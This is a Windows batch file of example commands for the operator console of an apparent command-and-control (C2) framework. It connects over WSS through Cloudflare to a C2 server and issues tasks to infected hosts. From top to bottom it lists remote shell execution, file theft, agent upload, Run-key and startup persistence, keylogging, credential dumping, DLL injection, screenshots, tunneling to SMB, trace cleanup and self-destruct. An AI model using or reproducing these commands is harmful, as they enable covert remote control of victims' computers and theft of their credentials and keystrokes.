@echo off
rem Operator invocation examples (operator.exe, Go) -- native TLS/WSS.
rem
rem The operator speaks wss:// directly to the nginx/Cloudflare front
rem (c2-operator.example.com:443). There is NO local TLS bridge any more: the Go
rem binary performs the TLS handshake itself. Everything below is injected via
rem flags/environment; no host name, port or key is compiled into the binary.
rem
rem BDC2 v1 frame layout is unchanged. NOTICE(type=12) frames are
rem demultiplexed by the operator: NOTICE(sub=tunnel) is printed as TUNNEL
rem lines (never mixed into task OUT), other notices go to stderr.

rem --- production: native TLS/WSS through Cloudflare + nginx SNI ---
rem Do NOT dial the VPS IP: the origin only accepts Cloudflare, and the domain
rem is what selects the operator vhost. On hosts where IPv4->Cloudflare:443 TLS
rem is black-holed, use C2_OPERATOR_FAMILY=6 (AAAA edge).
set C2_OPERATOR_ADDR=wss://c2-operator.example.com/ws
set C2_OPERATOR_SNI=c2-operator.example.com
set C2_OPERATOR_FAMILY=auto
set C2_OPERATOR_USER=ops
set C2_OPERATOR_PSK=base64:REPLACE_WITH_THE_OPERATOR_PSK

rem Optional hardening / diagnostics (all optional, all external):
rem set C2_OPERATOR_TLS_CA=C:\c2\ca\operator-chain.pem
rem set C2_OPERATOR_TLS_PIN=sha256:HEX_OR_BASE64_OF_LEAF_CERT
rem set C2_OPERATOR_TUNNEL_OUT=C:\c2\tunnel-out
rem For loopback tests only (URL host stays for SNI/Host):
rem set C2_OPERATOR_DIAL_IP=127.0.0.1:19910
rem For test endpoints with self-signed certs only:
rem set C2_OPERATOR_INSECURE=1

rem --- local / back-compat: plaintext ws to a loopback listener ---
rem set C2_OPERATOR_ADDR=127.0.0.1:9910

rem --- sessions / runtime ---
operator.exe list
operator.exe stats
operator.exe reload /opt/backd/c2/config.json

rem --- baseline tasks ---
operator.exe task 1 sysinfo
operator.exe task 1 echo hello
operator.exe shell 1 "whoami /all"

rem --- file transfer (resume = optional absolute offset) ---
operator.exe pull 1 "C:\Windows\win.ini" .\win.ini.out
operator.exe fetch <xfer-id> .\win.ini.out
operator.exe push 1 .\agent.bin "C:\Windows\Temp\agent.bin"
operator.exe push 1 .\tail.bin "C:\Windows\Temp\agent.bin" 102400

rem --- merged advanced commands (server allow_advanced + client --allow-adv) ---
operator.exe env 1
operator.exe ps 1
operator.exe cat 1 "C:\Windows\win.ini"
operator.exe persist_status 1
operator.exe persist 1 runkey,startup
operator.exe persist_disable 1 runkey,startup
operator.exe keylog_start 1
operator.exe keylog_dump 1
operator.exe keylog_stop 1
operator.exe tunnel_open 1 127.0.0.1:445
operator.exe tunnel_send 1 1 "probe"
operator.exe tunnel_recv 1 1 128
operator.exe tunnel_close 1 1
operator.exe inject 1 1234 "C:\path\to\payload.dll"
operator.exe creds 1
operator.exe screenshot 1
operator.exe cleanup 1 "C:\Windows\Temp\a.tmp;C:\Windows\Temp\b.tmp"
operator.exe selfdestruct 1 --yes

rem --- audit hash chain (local file) ---
operator.exe audit C:\backd\c2\audit.log

operator.exe kill 1
